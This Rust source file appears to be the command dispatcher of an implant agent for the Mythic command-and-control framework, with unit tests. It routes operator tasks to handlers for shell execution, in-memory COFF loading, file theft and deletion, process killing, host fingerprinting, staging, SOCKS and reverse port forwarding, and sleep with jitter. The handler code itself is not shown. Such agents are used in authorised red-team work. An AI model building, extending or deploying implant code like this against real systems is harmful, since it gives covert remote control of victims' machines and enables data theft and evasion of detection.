mod coff;
mod exec;
mod file;
mod fingerprint;
mod process;
mod stage;
mod system;

use crate::protocol::{Task, TaskResponse};

pub enum CommandAction {
    None,
    Exit,
    Sleep { interval: u64, jitter: u8 },
    Rpfwd { start: bool, port: u16 },
    Download { path: String, data: Vec<u8> },
}

pub struct CommandResult {
    pub response: TaskResponse,
    pub action: CommandAction,
}

fn text_response(output: String) -> String {
    // Mythic displays user_output verbatim. Only the outer agent envelope and
    // binary protocol fields (file/proxy chunks) are Base64 encoded.
    output
}

pub fn dispatch(task: Task) -> CommandResult {
    let mut action = CommandAction::None;
    let result = match task.command.as_str() {
        "coff" => coff::run(&task.parameters),
        "exec" | "shell" => exec::run(&task.parameters),
        "download" => file::read(&task.parameters).map(|(path, data)| {
            action = CommandAction::Download { path, data };
            String::new()
        }),
        "cat" | "ls" | "mkdir" | "mv" | "rm" | "write" | "upload" => {
            file::run(&task.command, &task.parameters)
        }
        "ps" | "kill" => process::run(&task.command, &task.parameters),
        "cd" | "pwd" | "whoami" | "hostname" => system::run(&task.command, &task.parameters),
        "fingerprint" => fingerprint::run(),
        "stage1" => stage::run(&task.parameters),
        "socks" => Ok("proxy state updated".into()),
        "rpfwd" => parse_proxy(&task.parameters).map(|(start, port)| {
            action = CommandAction::Rpfwd { start, port };
            "proxy state updated".into()
        }),
        "sleep" => parse_sleep(&task.parameters).map(|(interval, jitter)| {
            action = CommandAction::Sleep { interval, jitter };
            format!("sleep set to {interval}s with {jitter}% jitter")
        }),
        "exit" => {
            action = CommandAction::Exit;
            Ok("callback exiting".into())
        }
        _ => Err(format!("unsupported command: {}", task.command)),
    };
    let response = match result {
        Ok(output) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("success".into()),
            user_output: Some(text_response(output)),
            download: None,
        },
        Err(output) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some(format!("error: {output}")),
            user_output: Some(text_response(output)),
            download: None,
        },
    };
    CommandResult { response, action }
}

fn parse_sleep(parameters: &str) -> Result<(u64, u8), String> {
    let value: serde_json::Value = serde_json::from_str(parameters).map_err(|e| e.to_string())?;
    let interval = value
        .get("interval")
        .and_then(|v| v.as_u64())
        .ok_or("missing interval")?;
    let jitter = value.get("jitter").and_then(|v| v.as_u64()).unwrap_or(0);
    if jitter > 100 {
        return Err("jitter must be between 0 and 100".into());
    }
    Ok((interval, jitter as u8))
}

fn parse_proxy(parameters: &str) -> Result<(bool, u16), String> {
    let value: serde_json::Value = serde_json::from_str(parameters).map_err(|e| e.to_string())?;
    let action = value
        .get("action")
        .and_then(|v| v.as_str())
        .ok_or("missing action")?;
    let port = value
        .get("port")
        .and_then(|v| v.as_u64())
        .ok_or("missing port")?;
    if port == 0 || port > u16::MAX as u64 {
        return Err("invalid port".into());
    }
    match action {
        "start" => Ok((true, port as u16)),
        "stop" => Ok((false, port as u16)),
        _ => Err("action must be start or stop".into()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn task(command: &str, parameters: &str) -> Task {
        Task {
            command: command.into(),
            parameters: parameters.into(),
            id: "task-id".into(),
        }
    }

    #[test]
    fn sleep_returns_runtime_update() {
        let result = dispatch(task("sleep", r#"{"interval":30,"jitter":25}"#));
        assert!(matches!(
            result.action,
            CommandAction::Sleep {
                interval: 30,
                jitter: 25
            }
        ));
        assert_eq!(result.response.status.as_deref(), Some("success"));
    }

    #[test]
    fn unknown_commands_return_mythic_error_status() {
        let result = dispatch(task("missing", ""));
        assert_eq!(
            result.response.status.as_deref(),
            Some("error: unsupported command: missing")
        );
        assert_eq!(result.response.completed, Some(true));
    }

    #[test]
    fn invalid_rpfwd_port_is_rejected() {
        let result = dispatch(task("rpfwd", r#"{"action":"start","port":0}"#));
        assert_eq!(
            result.response.status.as_deref(),
            Some("error: invalid port")
        );
    }

    #[test]
    fn shell_output_is_not_base64_encoded() {
        assert_eq!(
            text_response("turbo\\domainuser\r\n".into()),
            "turbo\\domainuser\r\n"
        );
    }
}
